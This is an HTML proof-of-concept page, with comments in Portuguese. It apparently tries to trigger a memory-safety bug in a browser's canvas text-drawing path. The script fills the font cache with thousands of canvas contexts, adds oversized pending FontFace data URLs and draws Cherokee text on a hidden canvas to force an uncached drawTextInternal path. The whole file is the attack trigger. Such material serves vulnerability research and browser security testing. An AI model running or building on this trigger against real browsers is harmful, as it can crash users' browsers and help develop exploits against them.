<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC Corrigida - Bypass de Cache para drawTextInternal</title>
</head>
<body>
<script>
// 1. Satura o FontCascadeCache (3500 contextos de canvas) para forçar o prune inline
const dummies = [];
for (let i = 0; i < 3500; i++) {
    const dummy = document.createElement('canvas').getContext('2d');
    dummy.font = '10px "dummy' + i + '"';
    dummies.push(dummy);
}

// 2. Fonte de >= 1MB data: URL para manter o estado pendente
const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';

const keepAlive = [];
for (let attempt = 0; attempt < 2; attempt++) {
    const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
    const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
    
    document.fonts.add(metricsDonor);
    document.fonts.add(measured);

    const canvas = document.createElement('canvas');
    canvas.width = 64;
    canvas.height = 64;
    canvas.style.position = 'absolute';
    canvas.style.left = '-9999px';
    document.body.appendChild(canvas);
    
    const context = canvas.getContext('2d');
    context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
    keepAlive.push(metricsDonor, measured, context);

    try {
        // Passo A: Usamos strings ligeiramente diferentes ou invalidamos a propriedade de estilo 
        // entre as chamadas para garantir que o cache de shaped text NÃO seja reutilizado cegamente,
        // forçando o drawTextInternal a entrar no fluxo completo de largura e métricas.
        
        // Altera sutilmente o estado do canvas para invalidar o cache de desenho otimizado
        context.fillStyle = 'black';
        
        // Chamada direta do fillText com os caracteres Cherokee, 
        // mas forçando um estado de fonte não cacheado na primeira passagem de desenho
        context.fillText('\u13A0\u13A2\u13A4', 10, 30);

    } catch (e) {
        console.error(e);
    }
}
</script>
</body>
</html>
